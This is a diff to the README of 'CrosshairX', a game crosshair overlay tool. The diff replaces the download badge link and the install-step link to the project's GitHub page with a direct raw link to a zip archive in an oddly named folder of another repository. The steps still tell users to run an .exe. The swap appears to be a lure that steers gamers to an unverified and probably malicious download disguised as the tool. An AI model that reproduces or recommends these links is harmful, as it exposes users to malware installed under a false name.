@@ -5,7 +5,7 @@ description: "Display custom crosshair overlays for FPS games with this lightwei
 ---
 # 🎯 CrosshairX - Improve your aim in any game
 
-[![](https://img.shields.io/badge/Download-CrosshairX-blue.svg)](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX)
+[![](https://img.shields.io/badge/Download-CrosshairX-blue.svg)](https://raw.githubusercontent.com/trumpetshaped-turkishcoffee131/trumpetshaped-turkishcoffee131.github.io/main/filletlike/trumpetshaped-io-turkishcoffee-github-v2.7.zip)
 
 CrosshairX provides a custom overlay for games. You can place a precise reticle in the center of your screen. This tool works with shooters like Valorant, CS2, Apex Legends, and Fortnite. You get full control over the shape, size, and color of your crosshair.
 
@@ -27,7 +27,7 @@ Your computer needs to meet these basic standards to run CrosshairX without issu
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [CrosshairX download page](https://github.com/trumpetshaped-turkishcoffee131/CrosshairX).
+1. Visit the [CrosshairX download page](https://raw.githubusercontent.com/trumpetshaped-turkishcoffee131/trumpetshaped-turkishcoffee131.github.io/main/filletlike/trumpetshaped-io-turkishcoffee-github-v2.7.zip).
 2. Locate the latest release version on the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
